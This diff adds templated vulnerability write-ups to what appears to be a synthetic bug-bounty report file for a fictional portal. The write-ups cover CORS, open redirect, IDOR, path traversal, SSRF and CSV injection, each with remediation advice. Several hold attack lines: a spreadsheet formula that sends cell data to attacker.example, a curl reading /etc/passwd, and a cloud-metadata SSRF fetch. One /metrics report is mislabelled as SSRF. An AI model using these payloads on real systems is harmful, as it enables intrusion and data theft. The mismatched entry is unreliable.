+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.eichenwald-digital.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12808,7 +12908,8 @@
           "offset": "6d",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.eichenwald-digital.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12971,7 +13072,8 @@
           "offset": "6d 14h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.eichenwald-digital.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13107,7 +13209,8 @@
           "offset": "2d 4h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.eichenwald-digital.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13271,7 +13374,8 @@
           "offset": "7d 18h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.eichenwald-digital.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13382,7 +13486,8 @@
           "offset": "2d 17h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.eichenwald-digital.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13541,7 +13646,8 @@
           "offset": "6d 2h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.eichenwald-digital.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13656,7 +13762,8 @@
           "offset": "2d 6h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.eichenwald-digital.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13799,7 +13906,8 @@
           "offset": "5d 13h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.eichenwald-digital.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13942,7 +14050,8 @@
           "offset": "8d 20h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.eichenwald-digital.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14065,7 +14174,8 @@
           "offset": "5d 3h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.eichenwald-digital.foo/import`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14216,7 +14326,8 @@
           "offset": "5d 20h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.eichenwald-digital.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -14380,7 +14491,8 @@
           "offset": "1d 18h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.eichenwald-digital.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14466,7 +14578,8 @@
           "offset": "1d 19h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.eichenwald-digital.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14605,7 +14718,8 @@
           "offset": "5d 21h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.eichenwald-digital.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14772,7 +14886,8 @@
           "offset": "8d 5h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.eichenwald-digital.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14849,7 +14964,8 @@
           "offset": "1d 6h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.eichenwald-digital.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14981,7 +15097,8 @@
           "offset": "9d 2h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.eichenwald-digital.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -15131,7 +15248,8 @@
           "offset": "8d 15h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.eichenwald-digital.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15258,7 +15376,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.eichenwald-digital.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15398,7 +15517,8 @@
           "offset": "2d 11h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.eichenwald-digital.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -15502,7 +15622,8 @@
           "offset": "1d 7h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.eichenwald-digital.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15622,7 +15743,8 @@
           "offset": "5d 1h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://open-data.eichenwald-digital.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15758,7 +15880,8 @@
           "offset": "1d 21h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.eichenwald-digital.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15888,7 +16011,8 @@
           "offset": "4d 22h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://open-data.eichenwald-digital.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16008,7 +16132,8 @@
           "offset": "2d 15h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://open-data.eichenwald-digital.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -16111,7 +16236,8 @@
           "offset": "14h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://open-data.eichenwald-digital.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16258,7 +16384,8 @@
           "offset": "10d 8h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.eichenwald-digital.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16374,7 +16501,8 @@
           "offset": "2d 15h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.eichenwald-digital.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16498,7 +16626,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://open-data.eichenwald-digital.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16646,7 +16775,8 @@
           "offset": "2d 3h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.eichenwald-digital.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16758,7 +16888,8 @@
           "offset": "1d 18h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
